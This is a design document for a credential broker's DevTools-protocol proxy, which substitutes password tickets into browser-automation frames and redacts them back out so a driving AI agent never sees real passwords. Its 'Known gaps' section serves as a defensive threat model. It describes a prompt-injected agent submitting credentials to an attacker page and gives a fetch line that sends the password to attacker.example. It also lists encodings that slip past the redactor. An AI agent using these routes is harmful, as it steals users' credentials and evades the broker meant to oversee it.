# Browser credential injection via CDP substitution

Status: **implemented (v1)**, behind `CDP_PROXY_ENABLED=1`.
Code: `src/cdp/proxy.ts`, `src/cdp/substitution.ts`, `src/cdp/keystroke-detector.ts`,
`src/cdp-session-store.ts`, `src/browserbase-rewrite.ts`, wiring in `src/mitm.ts` and `src/index.ts`,
mint endpoint in `src/vault-handler.ts`.

## Problem

coatcheck's HTTPS path swaps tickets (`tok_*`) for real values in request
headers and URLs. Logging into a website from a remote browser is different:
the agent drives the browser with Playwright over a Chrome DevTools Protocol
(CDP) WebSocket, and the password travels inside a CDP frame such as
`Input.insertText`. The HTTPS MITM never sees that frame. Without help, the
agent process has to hold the cleartext password, which puts it in reach of
prompt injection.

CDP injection adds a second listener to coatcheck: a WebSocket proxy that sits
between the agent's Playwright client and the remote browser. It substitutes
tickets for real values on outbound CDP frames and redacts real values out of
inbound frames. The agent fills a login form with `page.fill(sel, "tok_…")`
and never sees the password.

Scope: ordinary HTML login forms. Sites that require 2FA/OTP at login are out
of scope.

## Why substitution, not session handover or per-site adapters

Two alternatives were considered and rejected.

- **Per-site adapters, broker-driven login.** coatcheck would hold the
  password and run a scripted login per site (selectors + steps). Every site
  needs an adapter, every redesign breaks one, and the library never covers the
  long tail.
- **Session handover via cookies.** coatcheck logs in itself and hands the
  agent an already-authenticated browser session. Clean isolation, but it
  still needs a per-site login script, so it inherits the adapter problem.

CDP substitution reaches the same end state (agent drives an authenticated
browser; password never enters agent context) with no per-site knowledge. Every
login form is handled identically: substitute outbound, redact inbound.
Maintenance scales with the number of CDP methods covered, not with the number
of sites.

## Architecture

```
agent ── HTTPS POST /v1/sessions (x-api-key: tok_…) ──▶ coatcheck :3128 (MITM)
                                                         │ swap ticket → real API key
                                                         │ rewrite response connectUrl
                                                         ▼
                                                    browser vendor REST API

agent ── ws://127.0.0.1:8444/cdp/{sid} ──▶ coatcheck :8444 (CDP proxy)
                                            │ outbound: tok_* → real value
                                            │ inbound:  real value → [REDACTED:…] or drop
                                            ▼
                                        vendor CDP endpoint (real connectUrl)
```

Both listeners run in one process and share the `TokenStore`. The CDP
listener binds to the same host as the HTTP listener (`PROXY_BIND_HOST`,
default `127.0.0.1`), port `CDP_PROXY_PORT` (default 8444)
(`src/index.ts`). If the CDP listener fails to bind,
the process exits (`src/index.ts`), so a deployment that gates the agent
on broker health also gates it on the CDP listener.

### Step 1: connectUrl rewrite

A remote-browser session is created over the vendor's REST API. The response
carries a `connectUrl` (a `wss://` URL with a signing key embedded). If the
agent received that URL it could connect directly and bypass substitution.

When the CDP proxy is enabled and the CONNECT target is the vendor API host,
coatcheck replaces the plain response pipe with a streaming rewriter
(`src/mitm.ts`). `createConnectUrlRewriter` (`src/browserbase-rewrite.ts`)
is a small HTTP/1.1 response parser:

- Frames each response by `Content-Length`, or decodes `Transfer-Encoding:
  chunked` and re-emits it with a `Content-Length` (`:72-78`, `:112-133`).
- If the body parses as JSON, every `connectUrl` string value at any depth is
  replaced (`replaceConnectUrls`, `:136-150`) and `Content-Length` recomputed.
- Non-JSON bodies pass through unchanged. A response with neither framing
  header switches the connection to raw passthrough for the rest of its life
  (`:80-86`).

The replacement is produced by `CdpSessionStore.register(realConnectUrl)`
(`src/cdp-session-store.ts:32`), which stores the real URL under a random
24-hex-char `sid` (12 random bytes) with a 10-minute TTL, and returns
`ws://{CDP_PROXY_ADVERTISE_HOST}:{CDP_PROXY_PORT}/cdp/{sid}`. The signing key
in the real URL never reaches the agent.

The rewrite only happens on a MITM'd connection. The MITM is only engaged when
the token store is non-empty at CONNECT time (`src/mitm.ts`); in practice
the session-create request carries the API-key ticket, so the store is
non-empty.

### Step 2: session-bound tickets (`POST /_vault/mint-tokens`)

Body: `{ "secretName": "<name>", "sessionId": "<sid>", "expires_in"?: <seconds> }`.

`handleMintTokens` (`src/vault-handler.ts:234-296`) reads the named secret,
requires it to be a JSON object with non-empty string `username` and
`password` fields, and issues two tickets with
`TokenStore.issueForSession(...)` (`src/token-store.ts:81`). TTL defaults to
600 s and is capped at 1800 s (`src/vault-handler.ts:222-223`, `:249-252`).
Response: `{ "username_token", "password_token", "expires_in" }`.

Session-bound tickets differ from ordinary tickets in two ways:

- `replaceAll` (the HTTP/HTTPS path) skips any entry with a `sessionId`
  (`src/token-store.ts:133`). A session-bound ticket never substitutes on the
  HTTPS path.
- `replaceAllForSession(input, sid)` (`:148`) substitutes only tickets bound to
  that sid. Ordinary (unscoped) tickets do not substitute inside CDP frames.

The lookup key is the secret name, not a domain. There is no association
between a credential and the site it belongs to (see Known gaps).

### Step 3: CDP proxy connection

`startCdpProxy` (`src/cdp/proxy.ts:37`) accepts `ws://…/cdp/{sid}`:

1. Parse the sid from the path (`/^\/cdp\/([a-f0-9]+)\/?$/`, `:201-204`) and
   resolve it in `CdpSessionStore`. Unknown or expired sid: close 1008
   (`:54-58`).
2. Enforce `MAX_CONCURRENT = 1` (`:11`, `:59-63`). A second concurrent
   connection is closed with 1013 "CDP proxy busy". v1 assumes one agent
   drives one browser at a time.
3. Dial the real `connectUrl`. Frames that arrive before the upstream opens are
   queued, capped at 256 (`pendingFrameCap`). Overflow sends a CDP error and
   tears down (`:139-144`). The upstream must open within 10 s or the
   connection is torn down (`:74-80`).
4. Relay frames in both directions through the substitution layer.

There is no authentication on the WebSocket upgrade beyond knowledge of the
sid. The sid is unguessable and only delivered to the agent in the rewritten
response, and the listener binds to loopback by default.

### Outbound substitution (agent → browser)

`substituteOutbound` (`src/cdp/substitution.ts:33-95`):

- Pre-filter: if the raw frame contains no `tok_` substring, forward it
  untouched without parsing (`:39`). Most CDP traffic skips JSON parsing.
- Otherwise parse and substitute only in these fields:

| CDP method               | Fields                                        | Typical Playwright call          |
|--------------------------|-----------------------------------------------|----------------------------------|
| `Input.insertText`       | `params.text`                                 | `page.fill(sel, ticket)`         |
| `Runtime.evaluate`       | `params.expression`                           | string-form `page.evaluate(...)` |
| `Runtime.callFunctionOn` | `params.functionDeclaration`, `params.arguments[*].value` | `page.evaluate(fn, ticket)` |

Playwright pads `Runtime.callFunctionOn.arguments` with internal entries
before user arguments (a probe saw the ticket at index 5), so the code walks
the whole array (`:62-69`).

- A frame of any other method that contains `tok_` is forwarded unmodified and
  logged as "token observed in unsupported method" (`:87-88`,
  `src/cdp/proxy.ts:123-127`). Deliberately not substituted in v1:
  `Network.setExtraHTTPHeaders`, `Page.addScriptToEvaluateOnNewDocument`,
  `Fetch.continueRequest`.
- Binary frames are forwarded without inspection (`src/cdp/proxy.ts:96-99`).

### Inbound redaction (browser → agent)

If a page (or the agent) reads back a field's value, for example
`Runtime.evaluate("document.querySelector('#pw').value")`, the real password
would arrive in the response frame. `substituteInbound`
(`src/cdp/substitution.ts:98-137`) defends this:

1. Collect the session's active real values (`TokenStore.sessionValues`,
   `src/token-store.ts:174`). None: forward as-is.
2. Byte-level floor: if no value occurs as a substring of the raw frame,
   forward as-is (`:106-114`).
3. Otherwise parse. Unparseable: **drop the frame** (`:117-123`).
4. Walk the JSON tree and replace each occurrence in string values with
   `[REDACTED:<secretName>]`, for example `[REDACTED:example-login:password]`
   (`:139-171`).
5. Re-serialize. If any real value still occurs in the output, drop the frame
   (`:130-134`).

A dropped frame is never forwarded, so the Playwright call that was waiting
for it hangs or times out rather than returning the secret
(`src/cdp/proxy.ts:168-171`). Binary inbound frames are forwarded without
inspection (`:163-166`).

The redaction marker carries the secret name, not the ticket id, and is not
re-substitutable: filling `[REDACTED:…]` into another field sends the marker
text literally.

### Keystroke detector: fail closed for `page.type()`

`page.fill()` sends the value in one `Input.insertText` frame, which the
outbound substitutor handles. `page.type()` sends one `Input.dispatchKeyEvent`
per character, so the ticket never appears whole in a single frame and cannot
be substituted without stateful buffering and replay, which v1 does not do.

Instead, `KeystrokeDetector` (`src/cdp/keystroke-detector.ts`) keeps an 80-char
sliding window of `params.text` from `Input.dispatchKeyEvent` frames, one
detector per connection. When the window ends with an active session-bound
ticket id (`TokenStore.sessionTokenIds`), the proxy drops that frame and
replies to the agent's request id with a CDP error:
`{"error":{"code":-32000,"message":"credential-flow violation: page.type() detected on a vault token; use page.fill() instead"}}`
(`src/cdp/proxy.ts:102-120`, `:227-233`). The session stays up.

What this guarantees: the real password is never sent (it was never going to
be, since keystrokes are not substituted) and the automation fails loudly
rather than appearing to succeed. What it does not guarantee: the first 67 of
the ticket's 68 characters have already been typed into the page by the time
the last keystroke matches. A ticket is useless outside its own CDP session,
so this leaks no secret, but the page has seen most of a ticket string.

`Input.dispatchKeyEvent` frames are never run through `substituteOutbound`
(`src/cdp/proxy.ts:118`).

### Teardown and revocation

`teardown()` (`src/cdp/proxy.ts:82-92`) runs once on client close, client
error, upstream close, upstream error, upstream connect timeout, or pending
buffer overflow. It:

- decrements the concurrency counter,
- revokes every ticket bound to the sid (`TokenStore.revokeSession`,
  `src/token-store.ts:204`),
- revokes the sid in `CdpSessionStore`, so a sid is single-use: reconnecting
  to the same `connectUrl` after close fails with 1008,
- closes both sockets.

It does not end the remote browser session at the vendor. Releasing that
session remains the client's job.

## Failure modes

| Condition | Behaviour |
|---|---|
| `CDP_PROXY_ENABLED` unset | No CDP listener; `connectUrl` not rewritten; agent receives the real vendor URL (`src/mitm.ts`, `src/index.ts`). Credential injection unavailable. |
| Token store empty at CONNECT time | Tunnel is passthrough; `connectUrl` not rewritten for that connection (`src/mitm.ts`). |
| sid unknown or expired (10 min) | WebSocket closed 1008. |
| Second concurrent CDP connection | Closed 1013. |
| Upstream does not open within 10 s | Torn down; session tickets revoked. |
| >256 frames queued before upstream opens | CDP error to client, torn down. |
| Ticket expired before use | Literal `tok_…` reaches the page; login fails visibly. |
| `page.type()` with a ticket | Last keystroke frame dropped, CDP error returned. |
| Real value echoed in an inbound frame that cannot be cleaned | Frame dropped; the awaiting client call stalls. |
| Ticket in an unsupported CDP method | Forwarded unsubstituted, warning logged. |
| CDP listener bind failure | Process exits. |

## Known gaps

- **No origin binding.** Session-bound tickets substitute on any
  `Input.insertText` / `Runtime.*` frame regardless of the page loaded. A
  prompt-injected agent that navigates to `https://attacker.example` and fills
  the ticket there sends the real credential to that page. Closing this means
  tracking each target's current origin (`Page.frameNavigated`) and
  substituting only on an allowed-origin match, with real edge cases (auth
  subdomains, OAuth/SSO redirects). Today the only guardrails are
  session-scoping and TTL.
- **`Runtime.evaluate` can exfiltrate directly.** Because `expression` and
  `functionDeclaration` are substitution sites, an agent can send
  `fetch('https://attacker.example/?p=' + 'tok_…')` and coatcheck will put the
  real value into the expression that runs in the page. The same lack of host
  binding as above; there is no restriction on what the substituted script
  does.
- **The redactor only matches the literal value.** Any transform defeats
  inbound redaction: `btoa(el.value)`, `el.value.split('').reverse().join('')`,
  `encodeURIComponent`, char codes, slicing into pieces across frames. An agent
  that can run script in the page can read the password back in transformed
  form.
- **Binary frames are not inspected** in either direction. Screenshots
  (`Page.captureScreenshot` returns base64 inside a text frame, which the
  literal-match redactor will not match) and any rendered password (for
  example after a "show password" toggle) reach the agent.
- **`mint-tokens` does not validate `sessionId`.** `handleMintTokens` accepts
  any string and does not check it against `CdpSessionStore`
  (`src/vault-handler.ts:240-247`; `VaultDeps` has no session store). Tickets
  can be minted for a sid that does not exist yet or never will; they simply
  never substitute until their TTL expires. It also means the caller, not
  coatcheck, decides which session a credential binds to.
- **Other routes to the same browser bypass the proxy.** Inbound redaction
  only covers traffic that flows through this listener. Any second CDP
  connection to the same remote browser (for example a vendor debug or
  live-view URL obtained from a REST endpoint whose response field is not named
  `connectUrl`) sees unredacted frames.
- **Authenticated-action abuse.** Once logged in, the agent can do anything the
  user can do on that site. Out of scope for a credential broker.
- **Vendor trust.** The remote browser vendor sees the real credential.

## Browser adapters

The vendor-specific pieces are small:

- the REST host whose responses are rewritten (`BROWSERBASE_API_HOST`,
  `src/server.ts`), and
- the response rewriter that finds and replaces the CDP URL
  (`src/browserbase-rewrite.ts`, keyed on the JSON field `connectUrl`).

Browserbase is the first such **browser adapter**. Everything else (the CDP
proxy, substitution, redaction, keystroke detection, session store) is
vendor-neutral CDP. The plan is to make an adapter an explicit plugin:

```ts
interface BrowserAdapter {
  /** REST host(s) whose responses carry CDP connect URLs. */
  hosts: string[];
  /** Streaming response rewriter; calls rewriteUrl(real) → local proxy URL. */
  createResponseRewriter(rewriteUrl: (realUrl: string) => string): { push(chunk: Buffer): Buffer };
}
```

A self-hosted Chrome, another vendor, or a local `--remote-debugging-port`
browser then becomes a new adapter rather than a fork. See `docs/ROADMAP.md`.

## Configuration

| Variable | Default | Meaning |
|---|---|---|
| `CDP_PROXY_ENABLED` | off | `1` enables the listener and `connectUrl` rewrite. |
| `CDP_PROXY_PORT` | `8444` | Listener port. |
| `CDP_PROXY_ADVERTISE_HOST` | `127.0.0.1` | Host written into rewritten URLs. Override when the client is in a different network namespace (e.g. separate containers in local dev). |
| `PROXY_BIND_HOST` | `127.0.0.1` | Bind address for both listeners. |

## Logging

The CDP proxy logs sids, counts (substitutions, redactions, revoked tickets),
method names for unsupported-method warnings, and fail-closed events. It does
not log frame bodies or real values. Tickets are opaque and safe to log.
